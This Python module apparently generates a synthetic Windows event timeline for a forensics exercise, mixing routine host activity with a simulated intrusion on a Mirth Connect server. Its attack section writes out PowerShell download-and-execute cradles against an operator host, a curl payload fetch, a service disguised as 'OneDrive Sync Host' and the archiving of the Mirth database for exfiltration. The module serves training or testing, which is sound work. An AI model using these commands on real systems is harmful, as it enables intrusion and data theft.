"""Línea temporal de int01: ruido de fondo (background) y ataque (attack)."""
import os
import re

from . import payloads
from .const import (ARDEAL_IP, BUCKET_HOST, BUCKET_IP, CMD, DOMAIN, FQDN, FUENTES, HOLIDAYS, HOST, JTORRES_SID,
                    JTORRES_WS_IP, KB_PUBLIC, MCSERVICE, MS_UPDATE_IP, NAS_IP, ONEDRIVE, ONESYNC, OP_IP,
                    POWERSHELL, REBOOT_T, TRIAGE_T, USERS, WINPTY_AGENT, WINPTY_DIR, WINPTY_DLL, sample)
from .sim import GUIDS
from .winfmt import FT, T, EvtType as S, TICKS, ft2dt, sec

FIRST_BOOT = FT(2026, 8, 18, 3, 12, 7.4)
VM_MAINT = FT(2026, 9, 15, 2, 4, 11.0)
DEFENDER_PLAT = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0"
SCANNER_POOL = None


def _scanners(rng):
    """IPs de escáneres de Internet (rangos de documentación, estables por semilla)."""
    global SCANNER_POOL
    if SCANNER_POOL is None:
        used = {"198.51.100.140", "198.51.100.89", "203.0.113.77", "203.0.113.180", "203.0.113.10",
                "203.0.113.58", "203.0.113.201"}
        pool = [f"{net}.{i}" for net in ("198.51.100", "203.0.113") for i in range(2, 255)]
        SCANNER_POOL = [ip for ip in pool if ip not in used]
    return SCANNER_POOL


def logon_rdp(sim, t, ukey="jtorres"):
    """Inicio de sesión RDP (4624 tipo 10 + 4672) y procesos de escritorio."""
    lid = sim.rng.randrange(0x200000, 0x7FFFFF)
    lguid = sim.logon_guid(t, lid)
    sim.logons[ukey] = (lid, lguid)
    sid, name, dom, _ = USERS[ukey]
    procs = sim.procs_at(t)
    winlogon = procs.get("winlogon") or procs["services"]
    sim.sec(t, 4624, 12544, [
        ("SubjectUserSid", S.SID, "S-1-5-18"), ("SubjectUserName", S.STR, HOST + "$"),
        ("SubjectDomainName", S.STR, DOMAIN), ("SubjectLogonId", S.HEX64, 0x3E7),
        ("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name), ("TargetDomainName", S.STR, dom),
        ("TargetLogonId", S.HEX64, lid), ("LogonType", S.U32, 10), ("LogonProcessName", S.STR, "User32 "),
        ("AuthenticationPackageName", S.STR, "Negotiate"), ("WorkstationName", S.STR, HOST),
        ("LogonGuid", S.GUID, "{00000000-0000-0000-0000-000000000000}"), ("TransmittedServices", S.STR, "-"),
        ("LmPackageName", S.STR, "-"), ("KeyLength", S.U32, 0), ("ProcessId", S.HEX64, winlogon.pid),
        ("ProcessName", S.STR, r"C:\Windows\System32\winlogon.exe"), ("IpAddress", S.STR, JTORRES_WS_IP),
        ("IpPort", S.STR, "0"), ("ImpersonationLevel", S.STR, "%%1833"), ("RestrictedAdminMode", S.STR, "%%1843"),
        ("TargetOutboundUserName", S.STR, "-"), ("TargetOutboundDomainName", S.STR, "-"),
        ("VirtualAccount", S.STR, "%%1843"), ("TargetLinkedLogonId", S.HEX64, 0), ("ElevatedToken", S.STR, "%%1842")],
        ver=2)
    sim.sec(t + sec(0.002), 4672, 12548, [
        ("SubjectUserSid", S.SID, sid), ("SubjectUserName", S.STR, name), ("SubjectDomainName", S.STR, dom),
        ("SubjectLogonId", S.HEX64, lid),
        ("PrivilegeList", S.STR, "SeSecurityPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n"
                                 "\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n"
                                 "\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege")])
    ui = sim.spawn(t + sec(1.1), r"C:\Windows\System32\userinit.exe", r"C:\Windows\system32\userinit.exe",
                   winlogon, ukey, integrity="High", life=4.0)
    exp = sim.spawn(t + sec(1.6), r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", ui, ukey,
                    integrity="High", cwd=r"C:\Windows\system32" + "\\")
    sim.spawn(t + sec(2.4), r"C:\Windows\System32\rdpclip.exe", "rdpclip", procs.get("svc_termsvc", winlogon), ukey,
              integrity="High")
    return lid, exp


def logoff(sim, t, lid, ukey="jtorres"):
    sid, name, dom, _ = USERS[ukey]
    sim.sec(t, 4647, 12545, [("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name),
                             ("TargetDomainName", S.STR, dom), ("TargetLogonId", S.HEX64, lid)])
    sim.sec(t + sec(2.3), 4634, 12545, [("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name),
                                        ("TargetDomainName", S.STR, dom), ("TargetLogonId", S.HEX64, lid),
                                        ("LogonType", S.U32, 10)])


def jtorres_visit(sim, t, reboot=False):
    """Revisión semanal de los canales de Mirth por RDP."""
    lid, exp = logon_rdp(sim, t)
    la = r"C:\Program Files\Mirth Connect Administrator Launcher"
    launcher = sim.spawn(t + sec(38.0), la + r"\launcher.exe", f'"{la}\\launcher.exe"', exp, "jtorres",
                         integrity="High", cwd=la + "\\")
    jw = sim.spawn(t + sec(41.5), la + r"\jre\bin\javaw.exe",
                   f'"{la}\\jre\\bin\\javaw.exe" -Xmx512m -jar launcher.jar https://localhost:8443',
                   launcher, "jtorres", integrity="High", cwd=la + "\\")
    if reboot:
        # 13/10: un canal se queda colgado y reinicia el servidor desde una consola
        c = sim.spawn(REBOOT_T - sec(14.0), CMD, f'"{CMD}"', exp, "jtorres", integrity="High")
        sim.console(REBOOT_T - sec(14.0), c)
        sim.spawn(REBOOT_T - sec(0.4), r"C:\Windows\System32\shutdown.exe",
                  'shutdown /r /t 0 /d p:4:1 /c "Canal ADT_Ardeal colgado, reinicio de int01"', c, "jtorres",
                  integrity="High")
        sim.shutdown(REBOOT_T, "jtorres", "Aplicación: mantenimiento (planeado)",
                     "Canal ADT_Ardeal colgado, reinicio de int01")
        return
    end = t + sec(sim.rng.uniform(25 * 60, 50 * 60))
    sim.exit(jw, end - sec(30))
    sim.exit(launcher, end - sec(29))
    logoff(sim, end, lid)


def defender_update(sim, t):
    procs = sim.procs_at(t)
    mp = procs.get("msmpeng")
    if mp is None:
        return
    n = (ft2dt(t) - ft2dt(FT(2026, 8, 1))).days
    ver = f"1.437.{120 + n}.0"
    sim.net(t, mp, MS_UPDATE_IP, 443, bytes_out=4200, bytes_in=sim.rng.randint(380_000, 1_900_000),
            dur=sim.rng.uniform(2, 9), log=False)
    sim.sys(t + sec(11.0), "Microsoft-Windows-Windows Defender", 2000, [
        ("Product Name", S.STR, "Antivirus de Microsoft Defender"), ("Product Version", S.STR, "4.18.25090.3009"),
        ("Signature Type", S.STR, "Antivirus"), ("Update Type", S.STR, "Delta"),
        ("User", S.STR, r"NT AUTHORITY\SYSTEM"), ("Current Engine Version", S.STR, "1.1.25090.4"),
        ("Previous Engine Version", S.STR, "1.1.25090.4"), ("Current Signature Version", S.STR, ver),
        ("Previous Signature Version", S.STR, f"1.437.{119 + n}.0")], ch="Defender",
        guid=GUIDS["Microsoft-Windows-Windows Defender"], kw=0x8000000000000000, pid=mp.pid, user="S-1-5-18")


def nightly_backup(sim, t):
    procs = sim.procs_at(t)
    sched = procs.get("svc_netsvcs")
    if sched is None:
        return
    c = sim.spawn(t, CMD, r'C:\Windows\system32\cmd.exe /c "C:\Scripts\backup_mirth.cmd"', sched, "system",
                  cwd=r"C:\Scripts" + "\\")
    sim.console(t, c)
    dur = sim.rng.uniform(140, 420)
    rc = sim.spawn(t + sec(0.3), r"C:\Windows\System32\Robocopy.exe",
                   r'robocopy "C:\Program Files\Mirth Connect\appdata" \\nas01\backup\int01\mirth /MIR /R:1 /W:5 /NP /LOG:C:\Scripts\backup.log',
                   c, "system", life=dur)
    sim.net(t + sec(0.5), rc, NAS_IP, 445, bytes_out=sim.rng.randint(8_000_000, 60_000_000), bytes_in=90_000,
            dur=dur - 1, log=False, rule="LAN")
    sim.exit(c, t + sec(dur + 0.4))


def system_noise(sim, t):
    procs = sim.procs_at(t)
    svc = procs.get("services")
    if svc is None:
        return
    for img, cmd, dt, life in [
        (r"C:\Windows\System32\CompatTelRunner.exe", r"C:\Windows\system32\compattelrunner.exe -maintenance", 0, 95),
        (r"C:\Windows\System32\sppsvc.exe", r"C:\Windows\system32\sppsvc.exe", 3600 * 3.2, 31),
        (r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe", 3600 * 7.7, 12),
        (r"C:\Windows\System32\wbem\WmiPrvSE.exe", r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",
         3600 * 9.1, 300)]:
        parent = procs.get("svc_netsvcs", svc) if "compattel" in img.lower() or "taskhostw" in img.lower() \
            else (procs.get("svc_dcom", svc) if "wmiprvse" in img.lower() else svc)
        sim.spawn(t + sec(dt + sim.rng.uniform(0, 600)), img, cmd, parent, "system", life=life)


def internet_noise(sim, day_t):
    rng = sim.rng
    pool = _scanners(rng)
    for _ in range(rng.randint(30, 120)):
        t = day_t + sec(rng.uniform(0, 86400))
        sim.inbound(t, rng.choice(pool), rng.randint(1024, 65000), 8443, bytes_in=rng.randint(300, 2600),
                    bytes_out=rng.randint(1800, 6200), dur=rng.uniform(0.05, 1.6), rule="TMP-soporte-mirth")
    for _ in range(rng.randint(20, 60)):
        t = day_t + sec(rng.uniform(0, 86400))
        sim.inbound(t, rng.choice(pool), rng.randint(1024, 65000), rng.choice((22, 23, 445, 3389, 5900, 80, 443)),
                    bytes_in=60, bytes_out=0, dur=0, rule="DEFAULT-DENY", action="deny")


def ardeal_mllp(sim, day_t):
    rng = sim.rng
    for _ in range(rng.randint(20, 60)):
        t = day_t + sec(rng.uniform(7 * 3600, 18 * 3600 - 5))
        sim.inbound(t, ARDEAL_IP, rng.randint(49152, 65000), 6661, bytes_in=rng.randint(2_000, 40_000),
                    bytes_out=rng.randint(200, 640), dur=rng.uniform(0.2, 2.0), rule="PUB-MLLP-ARDEAL")


def background(sim, t0, t1):
    """Todo lo que no es del atacante, de t0 a t1. El ataque se emite después con attack()."""
    if not sim.boots:
        sim.boot(FIRST_BOOT)
    day = FT(*ft2dt(t0).timetuple()[:3])
    while day < t1:
        d = ft2dt(day)
        if day <= VM_MAINT < day + sec(86400):
            sim.shutdown(VM_MAINT, "system", "Otro (planeado)",
                         "Mantenimiento del host de virtualización",
                         process=r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe")
            sim.boot(VM_MAINT + sec(201.0))
        workday = d.weekday() < 5 and (d.month, d.day) not in HOLIDAYS
        if workday:
            ardeal_mllp(sim, day)
        internet_noise(sim, day)
        if sim.boot_at(day + sec(4 * 3600)):
            defender_update(sim, day + sec(4 * 3600 + sim.rng.uniform(0, 1800)))
        if sim.boot_at(day + sec(1.5 * 3600)):
            nightly_backup(sim, day + sec(1.5 * 3600 + sim.rng.uniform(0, 120)))
        if sim.boot_at(day):
            system_noise(sim, day + sec(2 * 3600))
        if d.weekday() == 1:
            visit = day + sec(8 * 3600 + 15 * 60 + sim.rng.uniform(-600, 600))
            is_reboot_day = day <= REBOOT_T < day + sec(86400)
            jtorres_visit(sim, visit, reboot=is_reboot_day)
            if is_reboot_day:
                sim.boot(REBOOT_T + sec(118.0))
        day += sec(86400)
    for ch in sim.ev:
        sim.ev[ch] = [e for e in sim.ev[ch] if e.ft <= t1]


# ======================================================================= ataque
_RX_LINE = re.compile(r"^(\S+) \| GET \| (\S+) (\S+) \| UA=(.*)$")
SYS32 = "C:\\Windows\\System32\\"
RUN_URL = f"http://{OP_IP}:8090/run.ps1"
RUN2_URL = f"http://{OP_IP}:8090/run2.ps1"
IWR_URL = f"http://{OP_IP}:8090/ping?h=INT01"
# Órdenes que el operador teclea en la shell interactiva: (hora, línea de comandos, imagen, vida en s, hijo opcional)
RECON = [
    (T(4, 19, 2, 11.0), "whoami /all", SYS32 + "whoami.exe", 0.31, None),
    (T(4, 19, 2, 40.0), "hostname", SYS32 + "HOSTNAME.EXE", 0.05, None),
    (T(4, 19, 3, 22.0), "ipconfig /all", SYS32 + "ipconfig.exe", 0.4, None),
    (T(4, 19, 4, 35.0), "systeminfo", SYS32 + "systeminfo.exe", 3.8, None),
    (T(4, 19, 6, 2.0), "quser", SYS32 + "quser.exe", 0.2, None),
    (T(4, 19, 6, 51.0), "tasklist /v", SYS32 + "tasklist.exe", 1.9, None),
    (T(4, 19, 8, 20.0), "netstat -ano", SYS32 + "NETSTAT.EXE", 0.9, None),
    (T(4, 19, 10, 44.0), 'net group "Domain Admins" /domain', SYS32 + "net.exe", 1.1,
     (SYS32 + "net1.exe", 'C:\\Windows\\system32\\net1 group "Domain Admins" /domain')),
    (T(4, 19, 12, 31.0), "nltest /dclist:kelbrook", SYS32 + "nltest.exe", 0.5, None),
]
# `dir "C:\Program Files\Mirth Connect\appdata"` (19:14:50) y `del` (19:42) son internos de cmd.exe: no crean proceso.


def _kb_lines():
    """Peticiones reales de la víctima del log (ya con IP y host de Kelbrook), en orden."""
    out = []
    with open(os.path.join(FUENTES, "access_real_saneado.log"), encoding="utf-8") as fh:
        for ln in fh:
            m = _RX_LINE.match(ln.rstrip("\n"))
            if m and m.group(2) == KB_PUBLIC:
                d, tt = m.group(1).split("T")
                y, mo, dd = map(int, d.split("-"))
                h, mi, ss = tt.split(":")
                out.append((FT(y, mo, dd, int(h), int(mi), float(ss)), m.group(3), m.group(4)))
    return out


def _beacon(sim, t_line, p, bytes_in, lead=None):
    """Conexión al :8090 que origina una línea del access.log; Sysmon 3 precede a la petición."""
    lead = sim.rng.uniform(0.05, 0.2) if lead is None else lead
    return sim.net(t_line - sec(lead), p, OP_IP, 8090, bytes_out=sim.rng.randint(150, 260), bytes_in=bytes_in,
                   dur=sim.rng.uniform(0.12, 0.3))


def _exploit(sim, t, cmdline, info):
    """Una petición a la API de Mirth ejecuta `cmd.exe /c <cmdline>` como hijo de mcservice.exe."""
    mc = sim.procs_at(t)["mcservice"]
    sim.inbound(t - sec(0.45), OP_IP, sim.rng.randint(40000, 60000), 8443, bytes_in=sim.rng.randint(2300, 3400),
                bytes_out=sim.rng.randint(1700, 2100), dur=0.4, rule="TMP-soporte-mirth")
    info["exploit_ts"].append(t)
    cmd = sim.spawn(t, CMD, f"cmd.exe /c {cmdline}", mc, "system", cwd=mc.cwd)
    sim.console(t, cmd)
    return cmd


def _powershell(sim, t_cmd, ps_args, text, info):
    """cmd.exe /c powershell <ps_args>, con su motor arrancado y el 4104 del comando."""
    cmd = _exploit(sim, t_cmd, f"powershell {ps_args}", info)
    ps = sim.spawn(t_cmd + sec(0.03), POWERSHELL, f"powershell {ps_args}", cmd, "system", cwd=cmd.cwd)
    sim.ps_session(t_cmd + sec(0.05), ps, text)
    return cmd, ps


def _fail_silently(sim, line, info, script_name):
    """run.ps1: descarga, baliza h=, Add-Type que no compila y fin silencioso del proceso."""
    t_run, t_ping = line[0][0], line[1][0]
    cmd_, ps_ = _powershell(sim, t_run - sec(1.0), f'-nop -c "IEX(New-Object Net.WebClient).DownloadString(\'{RUN_URL}\')"',
                            f"IEX(New-Object Net.WebClient).DownloadString('{RUN_URL}')", info)
    _beacon(sim, t_run, ps_, len(payloads.script(script_name)) + 190)
    sim.ps_block(t_run + sec(0.04), ps_, payloads.script(script_name))
    _beacon(sim, t_ping, ps_, 120)
    sim.addtype_compile(t_ping + sec(0.08), ps_, fails=True)
    sim.ps_end(t_ping + sec(1.3), ps_)
    sim.exit(cmd_, t_ping + sec(1.36))


def attack(sim):
    """Emite el ataque del 04/10 y la actividad periódica del implante hasta el triage.

    Se llama después de background(). Devuelve lo que fijan los eventos y otras fuentes necesitan.
    """
    rng = sim.rng
    ln = _kb_lines()
    assert len(ln) == 13
    info = {"exploit_ts": [], "bucket": BUCKET_HOST}

    # --- huella de versión y primera orden (18:52)
    t_fp = T(4, 18, 52, 5.0)
    sim.inbound(t_fp, OP_IP, 51734, 8443, bytes_in=412, bytes_out=588, dur=0.2, rule="TMP-soporte-mirth")
    info["fingerprint_t"] = t_fp
    who = _exploit(sim, T(4, 18, 52, 48.0), "whoami", info)
    sim.spawn(T(4, 18, 52, 48.06), SYS32 + "whoami.exe", "whoami", who, "system", cwd=who.cwd, life=0.12)
    sim.exit(who, T(4, 18, 52, 48.25))

    # --- run.ps1 dos veces, la comprobación manual con iwr y run2.ps1
    _fail_silently(sim, ln[0:2], info, "run.ps1")
    t_iwr = ln[2][0]
    cmd_i, ps_i = _powershell(sim, t_iwr - sec(1.0), f'-c "iwr {IWR_URL} -UseBasicParsing"',
                              f"iwr {IWR_URL} -UseBasicParsing", info)
    _beacon(sim, t_iwr, ps_i, 160)
    sim.ps_end(t_iwr + sec(0.7), ps_i)
    sim.exit(cmd_i, t_iwr + sec(0.75))
    _fail_silently(sim, ln[3:5], info, "run.ps1")

    t_r2 = ln[5][0]
    cmd2, ps2 = _powershell(sim, t_r2 - sec(1.0), f'-nop -c "IEX(New-Object Net.WebClient).DownloadString(\'{RUN2_URL}\')"',
                            f"IEX(New-Object Net.WebClient).DownloadString('{RUN2_URL}')", info)
    _beacon(sim, t_r2, ps2, len(payloads.script("run2.ps1")) + 190)
    sim.ps_block(t_r2 + sec(0.04), ps2, payloads.script("run2.ps1"))
    _beacon(sim, ln[6][0], ps2, 130)
    sim.addtype_compile(ln[6][0] + sec(0.01), ps2, fails=True)
    _beacon(sim, ln[7][0], ps2, 150, lead=0.03)       # el catch envía addtype-err; run2.ps1 queda en su bucle

    # --- OneDrive.exe: descarga y ejecución en el mismo comando
    t_dl = ln[8][0]
    dl_cmd = f"(New-Object Net.WebClient).DownloadFile('http://{OP_IP}:8090/OneDrive.exe','{ONEDRIVE}'); & '{ONEDRIVE}'"
    cmd3, ps3 = _powershell(sim, t_dl - sec(1.0), f'-c "{dl_cmd}"', dl_cmd, info)
    od_size = sample(ONEDRIVE)["size"]
    _beacon(sim, t_dl, ps3, od_size + 190)
    sim.fcreate(t_dl + sec(0.2), ps3, ONEDRIVE, od_size)
    sim.fexe(t_dl + sec(0.22), ps3, ONEDRIVE)
    od = sim.spawn(t_dl + sec(0.28), ONEDRIVE, f'"{ONEDRIVE}"', ps3, "system", cwd=ps3.cwd)
    sim.image_load(t_dl + sec(0.31), od, r"C:\Windows\System32\mscoree.dll")
    sim.image_load(t_dl + sec(0.33), od, r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll")
    for i in range(9, 13):
        _beacon(sim, ln[i][0], od, 110, lead=rng.uniform(0.05, 0.12))
    info["alloc"] = int(ln[11][1].rsplit("-", 1)[1])
    info["thread"] = int(ln[12][1].rsplit("-", 1)[1])
    info["onedrive_pid"] = od.pid

    # --- fase 3: descarga cifrada con XOR 0x99 y sesión del implante por el mismo puerto
    t_s3 = ln[12][0] + sec(0.12)
    s3 = sim.net(t_s3, od, OP_IP, 8084, bytes_out=len(payloads.handshake()), bytes_in=payloads.STAGE3_SIZE, dur=2.1)
    info["stage3_conn"] = s3
    t_end = T(4, 19, 43, 0.0)
    sim.net(t_s3 + sec(3.4), od, OP_IP, 8084, bytes_out=rng.randint(90_000, 180_000),
            bytes_in=rng.randint(30_000, 70_000), dur=(t_end - t_s3) / TICKS - 3.4)

    # --- shell interactiva con winpty (19:01:30)
    t_w = T(4, 19, 1, 30.0)
    for path, dt in ((WINPTY_DLL, 0.2), (WINPTY_AGENT, 0.26)):
        sim.fcreate(t_w + sec(dt), od, path, sample(path)["size"])
        sim.fexe(t_w + sec(dt + 0.02), od, path)
    agent = sim.spawn(t_w + sec(1.1), WINPTY_AGENT,
                      f'"{WINPTY_AGENT}" \\\\.\\pipe\\winpty-control-{od.pid}-1 1 120 30', od, "system", cwd=WINPTY_DIR + "\\")
    sim.console(t_w + sec(1.1), agent)
    shell = sim.spawn(t_w + sec(1.4), CMD, "cmd.exe", agent, "system", cwd=ps3.cwd)
    for t, line, image, life, child in RECON:
        p = sim.spawn(t, image, line, shell, "system", cwd=ps3.cwd, life=life)
        if child:
            sim.spawn(t + sec(0.08), child[0], child[1], p, "system", cwd=ps3.cwd, life=life - 0.1)

    # --- implante persistente: descarga, instalación como servicio y arranque
    t_c = T(4, 19, 18, 30.0)
    curl = sim.spawn(t_c - sec(0.1), SYS32 + "curl.exe", f"curl.exe -s -o {ONESYNC} http://{OP_IP}:8090/client64.exe",
                     shell, "system", cwd=ps3.cwd)
    cl = sample(ONESYNC)["size"]
    sim.net(t_c + sec(0.4), curl, OP_IP, 8090, bytes_out=167, bytes_in=cl + 190, dur=1.6)
    sim.http(t_c + sec(0.5), "/client64.exe", "curl/7.55.1")
    sim.fcreate(t_c + sec(2.0), curl, ONESYNC, cl)
    sim.fexe(t_c + sec(2.02), curl, ONESYNC)
    sim.exit(curl, t_c + sec(2.2))

    t_i = T(4, 19, 19, 5.0)
    inst = sim.spawn(t_i, ONESYNC, f"{ONESYNC} install", shell, "system", cwd=ps3.cwd, life=1.4)
    svc = sim.procs_at(t_i)["services"]
    sim.service_install(t_i + sec(0.6), "OneSyncHost", "OneDrive Sync Host", ONESYNC, "auto start", "LocalSystem")
    key = r"HKLM\System\CurrentControlSet\Services\OneSyncHost" + "\\"
    for i, (name, details) in enumerate([("ImagePath", ONESYNC), ("DisplayName", "OneDrive Sync Host"),
                                         ("ObjectName", "LocalSystem"), ("Type", "DWORD (0x00000010)"),
                                         ("Start", "DWORD (0x00000002)"), ("ErrorControl", "DWORD (0x00000001)"),
                                         ("FailureActions", "Binary Data")]):
        sim.regset(t_i + sec(0.62 + i * 0.004), svc, key + name, details)

    t_s = T(4, 19, 19, 20.0)
    one1 = sim.spawn(t_s, ONESYNC, ONESYNC, svc, "system", cwd=r"C:\Windows\system32" + "\\")
    info["onesync_pid"] = one1.pid
    _service_running(sim, t_s + sec(0.4), svc)

    # --- recolección y exfiltración: la sube OneSyncHost con su SDK, sin curl
    size = rng.randint(180_000_000, 260_000_000)
    info["mc_tgz_size"] = size
    tgz = r"C:\Windows\Temp\mc.tgz"
    t_t = T(4, 19, 27, 40.0)
    tar = sim.spawn(t_t, SYS32 + "tar.exe", f'tar -czf {tgz} "C:\\Program Files\\Mirth Connect\\appdata\\mirthdb"',
                    shell, "system", cwd=ps3.cwd)
    sim.fcreate(t_t + sec(0.3), tar, tgz, 0)
    sim.exit(tar, T(4, 19, 33, 10.0))
    sim.files[tgz] = (t_t + sec(0.3), T(4, 19, 33, 10.0), size)

    polls = _poll_schedule(rng, t_s + sec(60.0), t_s + sec(3600.0), REBOOT_T)
    up_at = next(t for t in polls if t >= T(4, 19, 36, 0.0))
    for t in polls:
        _poll(sim, t, one1, task=(t == up_at))
    t_u = up_at + sec(1.6)
    sim.dns(t_u - sec(0.02), one1, BUCKET_HOST, [BUCKET_IP])
    sim.net(t_u, one1, BUCKET_IP, 443, bytes_out=int(size * 1.012), bytes_in=rng.randint(900, 1500),
            dur=size / rng.uniform(4.5e6, 7e6), dst_host=BUCKET_HOST)

    sim.fdelete(T(4, 19, 42, 0.0), shell, tgz)
    for p in (shell, agent):
        sim.exit(p, t_end + sec(0.03 if p is shell else 0.08))

    # --- 13/10: el reinicio mata lo que seguía vivo sin que Sysmon registre su fin
    kill = REBOOT_T + sec(21.5)
    for p in (od, ps2, cmd2, ps3, cmd3, one1):
        if p.end is None:
            p.end = kill
    sim.running = [p for p in sim.running if p.start > REBOOT_T]

    b2 = next(b for b in sim.boots if b["t"] > REBOOT_T)
    svc2 = b2["procs"]["services"]
    t_r = b2["t"] + sec(17.4)
    one2 = sim.spawn(t_r, ONESYNC, ONESYNC, svc2, "system", cwd=r"C:\Windows\system32" + "\\")
    _service_running(sim, t_r + sec(0.4), svc2)
    for t in _poll_schedule(rng, t_r + sec(60.0), t_r + sec(3600.0), TRIAGE_T - sec(60.0)):
        _poll(sim, t, one2)
    return info


def _service_running(sim, t, svc):
    sim.sys(t, "Service Control Manager", 7036,
            [("param1", S.STR, "OneDrive Sync Host"), ("param2", S.STR, "en ejecución"),
             ("Binary", S.BIN, "OneSyncHost".encode("utf-16-le")[:16])],
            guid=GUIDS["Service Control Manager"], esn="Service Control Manager", qual=16384,
            kw=0x8080000000000000, pid=svc.pid)


def _poll_schedule(rng, first, first_hour_end, stop):
    """Consulta del buzón: cada 60 s (±10 %) la primera hora y después cada 4 h (±10 %)."""
    out, t = [], first
    while t < first_hour_end and t < stop:
        out.append(t)
        t += sec(60.0 * rng.uniform(0.9, 1.1))
    while t < stop:
        out.append(t)
        t += sec(4 * 3600.0 * rng.uniform(0.9, 1.1))
    return out


def _poll(sim, t, p, task=False):
    """Una consulta al bucket OSS: resolución DNS y sesión HTTPS corta."""
    sim.dns(t - sec(0.03), p, BUCKET_HOST, [BUCKET_IP])
    sim.net(t, p, BUCKET_IP, 443, bytes_out=sim.rng.randint(520, 760),
            bytes_in=sim.rng.randint(1100, 1500) if task else sim.rng.randint(380, 600),
            dur=sim.rng.uniform(0.35, 0.9), dst_host=BUCKET_HOST)
